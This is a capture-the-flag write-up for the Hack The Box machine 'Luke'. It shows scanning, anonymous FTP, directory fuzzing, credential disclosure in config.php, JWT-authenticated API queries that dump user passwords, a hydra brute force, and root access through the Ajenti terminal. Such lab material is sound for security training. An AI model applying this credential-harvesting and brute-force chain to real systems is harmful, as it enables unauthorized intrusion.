---
title: "[HTB] Machine: Luke"
description: "[HTB] Machine: Luke"
date: 2023-09-09
menu:
  sidebar:
    name: "[HTB] Machine: Luke"
    identifier: htb-machine-Luke
    parent: htb-machines-linux
    weight: 10
hero: images/luke.png
tags: ["HTB", "credentials", "api", "nodejs", "jwt", "wfuzz", "ajenti", "hydra"]
---

# Luke
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.137 -T4                                                          
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 15:00 BST
Warning: 10.10.10.137 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.137 (10.10.10.137)
Host is up (0.17s latency).
Not shown: 65463 closed tcp ports (conn-refused), 67 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt
```
```
└─$ nmap -Pn -p21,22,80,3000,8000 -sC -sV 10.10.10.137 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 15:21 BST
Nmap scan report for 10.10.10.137 (10.10.10.137)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.76 seconds

```
- `ftp`
```
└─$ ftp anonymous@10.10.10.137                        
Connected to 10.10.10.137.
220 vsFTPd 3.0.3+ (ext.1) ready...
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61479|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
226 Directory send OK.
ftp> cd webapp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||7650|)
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14  2019 for_Chihiro.txt
226 Directory send OK.
ftp> more for_Chihiro.txt
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry  
```

- Web Server

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.137/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.137/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/09/09 15:28:12 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1593]
/member               (Status: 301) [Size: 235] [--> http://10.10.10.137/member/]
/management           (Status: 401) [Size: 381]
/css                  (Status: 301) [Size: 232] [--> http://10.10.10.137/css/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.10.137/js/]
/vendor               (Status: 301) [Size: 235] [--> http://10.10.10.137/vendor/]
/config.php           (Status: 200) [Size: 202]
/LICENSE              (Status: 200) [Size: 1093]
```

## Foothold/Root
- We have `root` creds in `/config.php`
  - `root:Zk6heYCyv6ZE9Xcg`

![](./images/2.png)

- We have `/management` and `/login.php`
  - I tried `root:Zk6heYCyv6ZE9Xcg` but didn't work

![](./images/3.png)

![](./images/4.png)

- Let's check other ports `8000`
  - `Ajenti` login the creds didn't work also

![](./images/6.png)

- Port `3000` has an `API`
  - I get `Auth token is not supplied`

![](./images/5.png)

- Let's try fuzzing `api` endpoints
```
└─$ wfuzz -c -u "http://10.10.10.137:3000/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.137:3000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        0 L      5 W        56 Ch       "# directory-list-2.3-medium.xt"                                                                                                                                          
000000003:   200        0 L      5 W        56 Ch       "# Copyright 2007 James Fisher"
000000007:   200        0 L      5 W        56 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/                                                                                                          
000000014:   200        0 L      5 W        56 Ch       "http://10.10.10.137:3000/                                                                                                                                                
000000010:   200        0 L      5 W        56 Ch       #"                                                                                                                                                                        
000000009:   200        0 L      5 W        56 Ch       "# Suite 300, San Francisco, California, 94105, USA."
000000005:   200        0 L      5 W        56 Ch       "# This work is licensed under the Creative Commons"
000000013:   200        0 L      5 W        56 Ch       "#"
000000012:   200        0 L      5 W        56 Ch       "# on at least 2 different hosts"
000000008:   200        0 L      5 W        56 Ch       "# or send a letter to Creative Commons, 171 Second Street,"
000000006:   200        0 L      5 W        56 Ch       "# Attribution-Share Alike 3.0 License. To view a copy of this"
000000011:   200        0 L      5 W        56 Ch       "# Priority ordered case-sensitive list, where entries were found"
000000002:   200        0 L      5 W        56 Ch       "#"
000000004:   200        0 L      5 W        56 Ch       "#"
000000053:   200        0 L      2 W        13 Ch       "login"
000000202:   200        0 L      5 W        56 Ch       "users"
000000825:   200        0 L      2 W        13 Ch       "Login"
000003701:   200        0 L      5 W        56 Ch       "Users"
```

- If we visit `/users`, we receive the same message

![](./images/7.png)

- When we visit `/login` we receive `please auth` message

![](./images/8.png)

- I tried login using creds
  - Tried `root`, `luke` and `admin`
  - And `admin` worked
  - 

![](./images/9.png)

- Sending token to [jwt.io](https://jwt.io/) 

![](./images/10.png)

- We can use the token to query `/users`
```
└─$ curl -s http://10.10.10.137:3000/users -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U" | jq 
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]
```

- We can try each user
```
└─$ curl -s http://10.10.10.137:3000/users/admin -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U" | jq
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
```
```
└─$ curl -s http://10.10.10.137:3000/users/derry -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U" | jq
{
  "name": "Derry",
  "password": "rZ86wwLvx7jUxtch"
}
```
```
└─$ curl -s http://10.10.10.137:3000/users/yuri -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U" | jq 
{
  "name": "Yuri",
  "password": "bet@tester87"
}
```
```
└─$ curl -s http://10.10.10.137:3000/users/dory -H "authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U" | jq
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}
```
- The creds didn't work on port `8000` and `login.php`
  - So the only thing left is to try `/management`

```
└─$ hydra -L users.list -P passwords.list -f 10.10.10.137 http-get /management  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-09 16:05:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-get://10.10.10.137:80/management
[80][http-get] host: 10.10.10.137   login: Derry   password: rZ86wwLvx7jUxtch
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-09 16:05:58
```

- The content `/management`

![](./images/11.png)

- We have another password for `ajenti` page
  - `KpMasng6S5EtTy9Z`

![](./images/12.png)

- And now we can login to `Ajenti`

![](./images/13.png)

- We have a `Terminal` option
  - If we click `New`, it creates a new terminal
  - Click it and we have our `root` shell

![](./images/14.png)

![](./images/15.png)

